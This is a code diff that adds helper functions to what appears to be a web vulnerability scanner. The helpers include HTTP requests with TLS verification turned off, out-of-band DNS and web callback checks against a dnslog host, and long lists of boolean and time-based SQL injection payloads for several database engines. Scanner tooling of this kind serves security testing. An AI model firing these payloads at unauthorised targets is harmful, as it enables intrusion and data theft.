@@ -18,6 +18,14 @@ import urllib
 import redis
 import logging
 import pymysql
+import requests
+import requests.packages.urllib3
+import hashlib
+import mysql
+import time
+import httplib
+import ssl
+import urlparse
 import random
 import requests
 from requests import  ConnectTimeout
@@ -575,6 +583,259 @@ class RedisUtil(object):
 
     #def close(self):
     #    self.conn.close()
+
+def md5(data):
+    m = hashlib.md5()
+    m.update(data)
+    Hash = m.hexdigest()
+    return Hash[8:24]
+
+def http_lib_post(url, payload, headers=None, timeout=10):
+    try:
+        ssl._create_default_https_context = ssl._create_unverified_context
+        if not headers:
+            headers = {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36 IQIYI Cloud Security Scanner tp_cloud_security[at]qiyi.com',
+                        'Connection': 'Close'
+                      }
+        host = urlparse.urlparse(url).netloc
+        scheme = urlparse.urlparse(url).scheme
+        base = '{0}://{1}'.format(scheme, host)
+        path = url.replace(base, '', 1)
+        if scheme == 'http':
+            conn  = httplib.HTTPConnection(host, timeout=timeout)
+        else:
+            conn = httplib.HTTPSConnection(host, timeout=timeout)
+        conn.request('POST', path, payload, headers)
+        resp = conn.getresponse()
+        return resp.status, dict(resp.getheaders()), resp.read()
+    except Exception, e:
+        return -1, {}, ''
+
+def http_lib_get(url, headers=None, timeout=10):
+    try:
+        ssl._create_default_https_context = ssl._create_unverified_context
+        if not headers:
+            headers = {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36 IQIYI Cloud Security Scanner tp_cloud_security[at]qiyi.com',
+                        'Connection': 'Close'
+                      }
+        host = urlparse.urlparse(url).netloc
+        scheme = urlparse.urlparse(url).scheme
+        base = '{0}://{1}'.format(scheme, host)
+        path = url.replace(base, '', 1)
+        if scheme == 'http':
+            conn  = httplib.HTTPConnection(host, timeout=timeout)
+        else:
+            conn = httplib.HTTPSConnection(host, timeout=timeout)
+        conn.request('GET', path, headers=headers)
+        resp = conn.getresponse()
+        return resp.status, dict(resp.getheaders()), resp.read()
+    except Exception, e:
+        return -1, {}, ''
+
+def http_request_post(url, payload, headers=None, timeout=10, body_content_workflow=False, allow_redirects=False, allow_ssl_verify=False, time_check=None):
+    try:
+        if not headers:
+            headers = {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36 IQIYI Cloud Security Scanner tp_cloud_security[at]qiyi.com',
+                        'Connection': 'Close'
+                      }
+        time0 = time.time()
+        result = requests.post(url,
+            data=payload,
+            headers=headers,
+            stream=body_content_workflow,
+            timeout=timeout,
+            # proxies={'http':'http://127.0.0.1:8090'},
+            allow_redirects=allow_redirects,
+            verify=allow_ssl_verify)
+        time1 = time.time()
+        if time_check:
+            return result.status_code, result.headers, result.content, time1-time0
+        return result.status_code, result.headers, result.content
+    except Exception, e:
+        #print repr(e)
+        if time_check:
+            return -1, {}, '', 0
+        return -1, {}, ''
+
+def http_request_get(url, headers=None, timeout=10, body_content_workflow=False, allow_redirects=False, allow_ssl_verify=False, time_check=None):
+    try:
+        if not headers:
+            headers = {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36 IQIYI Cloud Security Scanner tp_cloud_security[at]qiyi.com',
+                        'Connection': 'Close'
+                      }
+        time0 = time.time()
+        result = requests.get(url,
+            headers=headers,
+            stream=body_content_workflow,
+            timeout=timeout,
+            allow_redirects=allow_redirects,
+            verify=allow_ssl_verify)
+        time1 = time.time()
+        if time_check:
+            return result.status_code, result.headers, result.content, time1-time0
+        return result.status_code, result.headers, result.content
+    except Exception, e:
+        if time_check:
+            return -1, {}, '', 0
+        return -1, {}, ''
+
+def get_remote_keyword():
+    return 'True'
+
+def get_remote_domain():
+    domain = 'devil.yoyostay.top'
+    return domain
+
+def check_remote_dns(domain):
+    url = 'http://dnslog.yoyostay.top/api/dns/devil/{0}/'.format(domain[:18])
+    code, head, html = http_request_get(url)
+    if 'True' in html:
+        return True
+    return False
+
+def check_remote_web(domain):
+    url = 'http://api.ceye.io/v1/records?token=token&type=request&filter={0}'.format(domain[:18])
+    code, head, html = http_request_get(url)
+    if 'name' in html:
+        return True
+    return False
+
+def get_headers(url, method, data, headers, proxy_headers=None):
+    try:
+        cookie = headers.get('Cookie')
+        referer = headers.get('Referer')
+        useragent = headers.get('User-Agent')
+        if not useragent:
+            useragent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36 IQIYI Cloud Security Scanner tp_cloud_security[at]qiyi.com'
+        if not referer:
+            referer = url
+        headers = {
+                    'User-Agent': useragent,
+                    'Connection': 'Close',
+                    'Cookie': cookie,
+                    'Referer': referer
+                  }
+        if proxy_headers != None:
+            headers = proxy_headers
+        return headers
+    except:
+        return {}
+
+def InLog(md5, data):
+    try:
+        db = mysql.MySQL()
+        stime = time.strftime('%Y-%m-%d %H:%M:%S')
+        value = [md5, stime, data]
+        db.insert('insert into info_blind_log values(NULL,%s,%s,%s)',value)
+        db.commit()
+        db.close()
+    except Exception,e:
+        print Exception,":",e
+        db.close()
+
+def cookie_filter(key):
+    keys = ['__utm', 'PHPSESSID', 'JSESSIONID', 'ASPSESSION', 'ASP.NET_SessionId', 'Hm_l', '_ga']
+    for line in keys:
+        if line in key:
+            return False
+    return True
+
+def sqli_bool_payloads():
+    payloads = [
+                    '%s',
+                    ' AND %d=%d',
+                    "'AND'%d'='%d",
+                    '"AND"%d"="%d',
+                    "%%' AND %d=%d AND '%%'='",
+                    '%%" AND %d=%d AND "%%"="',
+                    ' OR NOT (%d>%d)',
+                    "\xbf' OR %d=%d#",
+
+                    ' AND %d=%d-- -',
+                    ' AND %d=%d#',
+                    ') AND %d=%d-- -',
+                    ') AND %d=%d#',
+                    "' AND %d=%d-- -",
+                    "' AND %d=%d#",
+                    "') AND %d=%d-- -",
+                    "') AND %d=%d#",
+
+                    ' OR NOT (%d>%d)-- -',
+                    ' OR NOT (%d>%d)#',
+                    ') OR NOT (%d>%d)-- -',
+                    ') OR NOT (%d>%d)#',
+                    "' OR NOT (%d>%d)-- -",
+                    "' OR NOT (%d>%d)#",
+                    "') OR NOT (%d>%d)-- -",
+                    "') OR NOT (%d>%d)#",
+               ]
+    return payloads
+
+def sqli_time_payloads():
+    payloads = [
+                    ' AND (SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))zpGO)',
+                    "' AND (SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))zpGO) AND '22'='22",
+                    ') AND (SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))zpGO) AND (22=22',
+                    "') AND (SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))zpGO) AND ('22'='22",
+                    "%' AND (SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))zpGO) AND '%'='",
+                    " AND (SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))zpGO)-- -",
+                    ",(SELECT*FROM(SELECT(SLEEP(TIMESLEEP)))zpGO)",
+                    ",(SELECT*FROM(SELECT(SLEEP(TIMESLEEP)))zpGO)as1",
+                    "\xbf' AND (SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))zpGO)#",
+
+                    " WAITFOR DELAY '0:0:TIMESLEEP'",
+                    "' WAITFOR DELAY '0:0:TIMESLEEP' AND '22'='22",
+                    ") WAITFOR DELAY '0:0:TIMESLEEP' AND (2=2",
+                    "') WAITFOR DELAY '0:0:TIMESLEEP' AND ('22'='22",
+                    "%' WAITFOR DELAY '0:0:TIMESLEEP' AND '%'='",
+                    " WAITFOR DELAY '0:0:TIMESLEEP'-- -",
+
+                    " AND 8096=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(113)||CHR(86)||CHR(102),TIMESLEEP)",
+                    "' AND 8096=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(113)||CHR(86)||CHR(102),TIMESLEEP) AND '22'='22",
+                    ") AND 8096=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(113)||CHR(86)||CHR(102),TIMESLEEP) AND (22=22",
+                    "') AND 8096=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(113)||CHR(86)||CHR(102),TIMESLEEP) AND ('22'='22",
+                    "%' AND 8096=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(113)||CHR(86)||CHR(102),TIMESLEEP) AND '%'='",
+                    " AND 8096=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(113)||CHR(86)||CHR(102),TIMESLEEP)-- -",
+
+                    " AND 3112=(SELECT 3112 FROM PG_SLEEP(TIMESLEEP))",
+                    "' AND 3112=(SELECT 3112 FROM PG_SLEEP(TIMESLEEP)) AND '22'='22",
+                    ") AND 3112=(SELECT 3112 FROM PG_SLEEP(TIMESLEEP)) AND (22=22",
+                    "') AND 3112=(SELECT 3112 FROM PG_SLEEP(TIMESLEEP)) AND ('22'='22",
+                    "%' AND 3112=(SELECT 3112 FROM PG_SLEEP(TIMESLEEP)) AND '%'='",
+                    " AND 3112=(SELECT 3112 FROM PG_SLEEP(TIMESLEEP))-- -",
+
+                    ";(SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))IiMY)#",
+                    "';(SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))IiMY)#",
+                    ");(SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))IiMY)#",
+                    "');(SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))IiMY)#",
+                    "%';(SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))IiMY)#",
+
+                    ";WAITFOR DELAY '0:0:TIMESLEEP'--",
+                    "';WAITFOR DELAY '0:0:TIMESLEEP'--",
+                    ");WAITFOR DELAY '0:0:TIMESLEEP'--",
+                    "');WAITFOR DELAY '0:0:TIMESLEEP'--",
+                    "%';WAITFOR DELAY '0:0:TIMESLEEP'--",
+
+                    ";SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(73)||CHR(85)||CHR(118),TIMESLEEP) FROM DUAL--",
+                    "';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(73)||CHR(85)||CHR(118),TIMESLEEP) FROM DUAL--",
+                    ");SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(73)||CHR(85)||CHR(118),TIMESLEEP) FROM DUAL--",
+                    "');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(73)||CHR(85)||CHR(118),TIMESLEEP) FROM DUAL--",
+                    "%';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(73)||CHR(85)||CHR(118),TIMESLEEP) FROM DUAL--",
+
+                    ";SELECT PG_SLEEP(TIMESLEEP)--",
+                    "';SELECT PG_SLEEP(TIMESLEEP)--",
+                    ");SELECT PG_SLEEP(TIMESLEEP)--",
+                    "');SELECT PG_SLEEP(TIMESLEEP)--",
+                    "%';SELECT PG_SLEEP(TIMESLEEP)--",
+               ]
+    return payloads
+
+
+
 
 if __name__ == '__main__':
     '''
